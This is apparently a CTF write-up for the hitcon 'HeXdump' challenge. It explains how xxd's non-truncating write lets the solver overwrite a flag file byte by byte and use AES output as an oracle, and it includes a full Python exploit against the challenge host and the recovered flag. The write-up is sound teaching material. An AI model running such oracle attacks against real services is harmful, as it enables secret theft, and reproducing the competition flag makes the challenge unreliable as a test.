# HeXdump (misc, 202p, 62 solved)

In the challenge we get source code of a [service](heXDump.rb) and access to this service.

The logic of the application is pretty simple:

- We can select `output mode` from MD5, SHA1 and AES hexdump.
- We can write some data into the `input file`.
- We can request to get back data from the `input file`, respecting the output. mode we selected.
- There is a special option which will place the flag file as `input file`.

Working with our own data is not very interesting, so the first step is to run the `1337` command to start working with flag file.

Now we can get back MD5, SHA1 or AES encrypted data from this file, but it's not enough to recover the flag.
It's also not a crypto but misc challenge.

The key function is:

```ruby
def write
  puts 'Data? (In hex format)'
  data = gets
  return false unless data && !data.empty? && data.size < 0x1000

  IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
  return false unless $CHILD_STATUS.success?

  true
end
```

The data we write to `input file` are put there using `xxd -r -ps - #{@file}`.
If we look into the documentation we can see:

```
-r | -revert
    reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere. 
```

Key part is `If not writing to stdout, xxd writes into its output file without truncating it.`

This means that if we provide only 1 character as input, it will overwrite only 1st byte.
We can use this feature to recover flag byte by byte:

1. Get back original flag output (of any kind, but we can use AES just to be sure there is no accidental collision).
2. Loop over flag charset and overwrite 1st character with each possible value, and get back output.
3. If output with overwritten character matches the original flag output, it means that we substituted character by itself, and thus we know 1 character of the flag.

Once we know the 1st character, we can do the same, now sending 2 bytes, the one we know plus again random value from charset.
We proceed with that until we recover all flag bytes:

```python
import string

from crypto_commons.netcat.netcat_commons import nc, receive_until_match, send, receive_until


def setup_connection(host, port):
    s = nc(host, port)
    print(receive_until_match(s, "0\) quit\n"))
    send(s, "1337")
    print(receive_until_match(s, "0\) quit\n"))
    send(s, "3")
    print(receive_until_match(s, "- AES"))
    send(s, "aes")
    print(receive_until_match(s, "0\) quit\n"))
    send(s, "2")
    real = receive_until(s, "\n")[:-1]
    print('real', real)
    print(receive_until_match(s, "0\) quit"))
    return real, s


def get_new_ct(test_char, known_flag_prefix, s):
    send(s, "1")
    receive_until_match(s, "Data\? \(In hex format\)")
    send(s, (known_flag_prefix + test_char).encode("hex"))
    receive_until_match(s, "0\) quit\n")
    send(s, "2")
    current = receive_until(s, "\n")[:-1]
    receive_until_match(s, "0\) quit\n")
    print(test_char, 'current', current)
    return current


def main():
    known_flag = "hitcon{"
    host = "13.113.205.160"
    port = 21700
    real, s = setup_connection(host, port)
    while '}' not in known_flag:
        for c in string.lowercase + string.digits + string.uppercase + string.punctuation:
            try:
                current = get_new_ct(c, known_flag, s)
                if real == current:
                    known_flag += c
                    print(known_flag)
                    break
            except:
                real, s = setup_connection(host, port)
                current = get_new_ct(c, known_flag, s)
                if real == current:
                    known_flag += c
                    print(known_flag)
                    break


main()
```

After a while we recover: `hitcon{xxd?XDD!ed45dc4df7d0b79}`
